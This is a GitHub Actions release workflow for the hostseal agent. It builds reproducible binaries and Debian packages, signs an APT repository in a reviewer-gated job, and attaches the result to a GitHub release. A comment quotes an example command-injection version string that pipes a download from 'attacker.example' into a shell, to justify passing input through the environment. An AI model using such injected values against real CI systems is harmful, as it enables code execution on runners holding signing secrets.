# Build, sign and publish a release.
#
# Two things here are load-bearing rather than ceremony. The build is reproducible, so that anybody can
# rebuild the tag and get the same bytes — which is the only way "the agent has no remote execution
# channel" is checkable against the binary somebody actually installed. And the APT repository is signed
# with a key that lives in this workflow and nowhere else, published to a custom domain, because the
# repository URL is written into /etc/apt/sources.list.d/hostseal.sources on every host that ever
# installs the agent and can never be migrated afterwards.
name: release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      version:
        description: "Version to build, without the leading v (for example 0.1.0)"
        required: true
        type: string

# No pages or id-token permission: this workflow no longer deploys the site. It signs the repository
# and attaches it to the release; `pages.yml` is the only thing that deploys, which is what keeps the
# two publications from overwriting each other.
#
# Read at the top and write on the one job that publishes, rather than write for both. The build job
# runs the tools that turn source into the artifact a release is made of — the Go toolchain, pnpm, nfpm
# — and each of them is a program somebody else wrote running beside a token. Granting it no more than
# it uses means a compromise there produces a bad artifact that a person still has to approve into the
# release environment, rather than a token that could move a tag and skip the person.
permissions:
  contents: read

concurrency:
  group: release
  cancel-in-progress: false

jobs:
  build:
    name: Build
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
          cache: true
          # Named explicitly because setup-go v6 changed the default from go.sum to go.mod. go.mod
          # lists the direct requirements; go.sum carries every transitive hash, which is what an
          # indirect bump moves — so the default would reuse a cache entry built before it.
          cache-dependency-path: go.sum

      - uses: pnpm/action-setup@ea17c68df8912ef543352723c149a84f56e3d413 # v6.1.0
        with:
          version: 10
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 22
          cache: pnpm
          cache-dependency-path: web/pnpm-lock.yaml

      - name: Resolve the version
        id: version
        # The dispatch input reaches the shell through the environment rather than through ${{ }}
        # interpolation. An interpolated input is pasted into the script before bash sees it, so a
        # version of `1.0.0"; curl attacker.example | sh; #` would run on a runner holding the release
        # signing key and the credentials that publish to every host's APT source — the one job in this
        # repository where arbitrary execution is worth the most. The pattern check is a second line:
        # what a release version may look like is not a matter of taste.
        env:
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          if [ -n "$INPUT_VERSION" ]; then
            version="$INPUT_VERSION"
          else
            version="${GITHUB_REF_NAME#v}"
          fi
          case "$version" in
            [0-9]*.[0-9]*.[0-9]*) ;;
            *) echo "refusing to release '$version': not a semantic version" >&2; exit 1 ;;
          esac
          if [ -n "$(printf %s "$version" | tr -d '0-9A-Za-z.+-')" ]; then
            echo "refusing to release '$version': it contains characters a version may not" >&2
            exit 1
          fi
          echo "version=$version" >> "$GITHUB_OUTPUT"
          echo "building $version"

      - name: The guarantee tests pass on the tag
        # A release is exactly the moment not to take the last CI run's word for it.
        run: make guarantee

      - name: Build the web application
        run: make web

      - name: Build reproducibly for every architecture
        # -trimpath removes the build directory from the binary, and SOURCE_DATE_EPOCH pins anything
        # time-dependent to the commit. Without both, two builds of the same source differ and the
        # reproducibility claim is not one anybody can check.
        env:
          CGO_ENABLED: "0"
        run: |
          export SOURCE_DATE_EPOCH=$(git log -1 --pretty=%ct)
          for arch in amd64 arm64; do
            for cmd in hostseal-agent hostseal-server hostseal; do
              GOARCH=$arch go build -trimpath \
                -ldflags "-s -w -buildid= \
                  -X github.com/pascalgross/hostseal/internal/buildinfo.Version=${{ steps.version.outputs.version }} \
                  -X github.com/pascalgross/hostseal/internal/buildinfo.Commit=$(git rev-parse --short HEAD)" \
                -o "dist/$arch/$cmd" "./cmd/$cmd"
            done
            for helper in apply-updates restart-unit reboot-host; do
              GOARCH=$arch go build -trimpath \
                -ldflags "-s -w -buildid= \
                  -X github.com/pascalgross/hostseal/internal/buildinfo.Version=${{ steps.version.outputs.version }}" \
                -o "dist/$arch/$helper" "./helpers/$helper"
            done
          done
          # The Windows agent, through the same Makefile target a maintainer runs, so that what ships
          # and what `make windows` produces cannot drift. It is read-only by design — see
          # docs/SECURITY.md §12 — and carries the operator's CLI too, because `hostseal enroll` runs on
          # the host and a machine without it can never enrol.
          make windows VERSION="${{ steps.version.outputs.version }}" COMMIT="$(git rev-parse --short HEAD)"

          # Written to a temporary file and moved into place: `find … | tee dist/SHA256SUMS` creates
          # the file before find has finished walking, so it lists itself with a checksum of nothing.
          find dist -type f -print0 | xargs -0 sha256sum > "$RUNNER_TEMP/SHA256SUMS"
          mv "$RUNNER_TEMP/SHA256SUMS" dist/SHA256SUMS
          cat dist/SHA256SUMS

      - name: Build the packages
        run: |
          make nfpm-install
          mkdir -p dist/packages
          for arch in amd64 arm64; do
            # nfpm reads its inputs from ../dist, the same place `make deb` puts them, so each
            # architecture's binaries are staged there in turn rather than the configuration growing a
            # per-architecture path it would then have to keep in step with the Makefile.
            cp dist/$arch/* dist/
            (cd packaging && VERSION="${{ steps.version.outputs.version }}" ARCH="$arch" \
              nfpm package --packager deb --target ../dist/packages)
          done
          ls -la dist/packages

      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: release-artifacts
          path: |
            dist/packages/*.deb
            dist/SHA256SUMS
            dist/amd64/*
            dist/arm64/*
            dist/hostseal-agent-windows-amd64.zip

  publish:
    name: Publish
    needs: build
    runs-on: ubuntu-latest
    # An environment of its own, holding APT_SIGNING_KEY, so a run that reaches this job waits for the
    # reviewers configured on it. Not `github-pages`, for two reasons that both bite. An environment
    # secret is readable by every job that enters the environment, and `pages.yml` enters `github-pages`
    # on every push to main — so sharing it would put the archive signing key within reach of each
    # documentation change, which is exactly what that split exists to prevent. And `github-pages`
    # carries a deployment rule limiting it to the default branch, which a tag is not: the first release
    # was rejected before it started, with no runner, no steps and no log to say why.
    # See docs/MAINTAINING.md §5.
    environment:
      name: release
    # The only job in the repository that may write to it, and the only one that needs to: creating the
    # release and attaching the signed archive to it is what `contents: write` is for here.
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: release-artifacts
          path: dist

      - name: Install apt-utils
        run: sudo apt-get update -qq && sudo apt-get install -y -qq apt-utils

      - name: Import the repository signing key
        env:
          APT_SIGNING_KEY: ${{ secrets.APT_SIGNING_KEY }}
        run: |
          if [ -z "$APT_SIGNING_KEY" ]; then
            echo "APT_SIGNING_KEY is not configured; refusing to publish an unsigned repository." >&2
            echo "Every host that installs the agent trusts this key for this repository only." >&2
            exit 1
          fi
          export GNUPGHOME=$(mktemp -d)
          chmod 700 "$GNUPGHOME"
          echo "GNUPGHOME=$GNUPGHOME" >> "$GITHUB_ENV"
          # Carriage returns are stripped before the armour reaches gpg. The key is pasted into the
          # secret by a person, and on Windows that paste routinely arrives CRLF-terminated — which
          # fails to import with an error about the armour rather than about line endings, at the end
          # of a release, which is a bad place to learn that.
          printf '%s' "$APT_SIGNING_KEY" | tr -d '\r' | gpg --batch --import
          gpg --list-secret-keys --with-colons | awk -F: '/^fpr:/{print "GPG_KEY_ID="$10; exit}' \
            >> "$GITHUB_ENV"

      - name: Build the signed repository
        env:
          # The repository URL is written into every host's sources file and can never be migrated, so
          # it is a repository variable rather than a literal here — and the build fails loudly if
          # nobody has set it, rather than publishing to a URL somebody has to live with.
          HOSTSEAL_APT_URL: ${{ vars.HOSTSEAL_APT_URL }}
        run: |
          if [ -z "$HOSTSEAL_APT_URL" ]; then
            echo "The repository variable HOSTSEAL_APT_URL is not set." >&2
            echo "Set it to a custom domain CNAME'd to GitHub Pages before the first release:" >&2
            echo "this URL is written into /etc/apt/sources.list.d/hostseal.sources on every host that" >&2
            echo "ever installs the agent, including fleets you will not be able to contact later." >&2
            exit 1
          fi
          ./packaging/apt/mkapt.sh dist/packages ./public
          cp dist/SHA256SUMS ./public/

      - name: Pack the repository for publication
        # Published as a release asset rather than deployed here. A Pages deployment replaces the whole
        # site, so if this job deployed the repository and the pages workflow deployed the
        # documentation, whichever ran second would delete the other. Handing the signed tree over as an
        # asset keeps one deployer, and keeps the signing key out of every documentation change.
        run: tar -czf apt-repository.tar.gz -C public .

      - name: GitHub release
        # A tag only. This is what separates a rehearsal from a release: `workflow_dispatch` runs from a
        # branch, and everything above it — the guarantee suite, the reproducible build, the key import,
        # the signing — is exactly what a rehearsal is for, while publishing is the one step that must
        # not happen by accident. The action would refuse a branch ref anyway ("GitHub Releases requires
        # a tag"), so without this the rehearsal ends in a red job that reads like a broken workflow
        # rather than a rehearsal that finished.
        if: startsWith(github.ref, 'refs/tags/')
        uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3.0.3
        with:
          files: |
            dist/packages/*.deb
            dist/SHA256SUMS
            apt-repository.tar.gz
          generate_release_notes: true
          body: |
            ## Installing

            ```bash
            curl -fsSL ${{ vars.HOSTSEAL_APT_URL }}/hostseal-archive-keyring.gpg \
              | sudo tee /usr/share/keyrings/hostseal-archive-keyring.gpg > /dev/null
            curl -fsSL ${{ vars.HOSTSEAL_APT_URL }}/hostseal.sources \
              | sudo tee /etc/apt/sources.list.d/hostseal.sources > /dev/null
            sudo apt-get update && sudo apt-get install hostseal-agent
            ```

            The agent installs with no keys in `/etc/hostseal/trusted-signers` and a policy that permits
            security updates and nothing else. It will report on the host and keep it patched, and will
            do nothing else until you say otherwise.

            ## Verifying the build

            The binaries are built with `-trimpath` and a pinned `SOURCE_DATE_EPOCH`, so rebuilding this
            tag reproduces them byte for byte. `SHA256SUMS` is attached.

            `apt-repository.tar.gz` is the signed repository exactly as published. The `pages` workflow
            unpacks it under `/apt`; it is attached so that the published tree can be verified against
            this release rather than taken on trust.
